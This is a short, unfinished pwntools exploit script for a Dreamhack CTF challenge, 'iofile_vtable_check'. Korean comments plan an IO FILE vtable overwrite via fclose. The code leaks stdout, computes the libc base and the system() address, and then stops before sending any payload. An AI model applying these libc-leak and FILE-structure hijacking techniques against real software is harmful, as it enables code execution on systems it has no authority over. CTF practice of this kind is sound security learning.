from pwn import *

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

이론...인데 수정하는 게 어려워 보인다.
도커 구성 하려 했지만 18.04라 크게 다른 건 없다고 생각해서 지금은 일단 이론 찾아보면서 만드는중

마지막에 fclose() 있으니까
JUMP_FIELD(_IO_finish_t, __finish); // fclose()
이거 쓰면 되지 않나?

아닌가.. 기억이 안난다.

대략적인 흐름은
fp에 페이로드 쓰는데, fp+0xe0에는 0이 들어가 있어야한다.
기억상 이쯤에는 딱히 필요한 값이 들어가진 않았던 것 같다.
구조체를 다시 봐야겠다.
'''

context.binary = elf = ELF("./iofile_vtable_check")
context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

def slog(n, a): return success(': '.join([n, hex(a)]))

HOST, PORT = 'host8.dreamhack.games 1234'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    p = process()
    libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1].strip(), 16)
print(hex(stdout))

lb = stdout - libc.sym["_IO_2_1_stdout_"]
system = lb + libc.sym["system"]

slog("stdout offset", libc.sym["_IO_2_1_stdout_"])
slog("libc_base", lb)
slog("system", system)

gdb.attach(p)
pause()



p.interactive()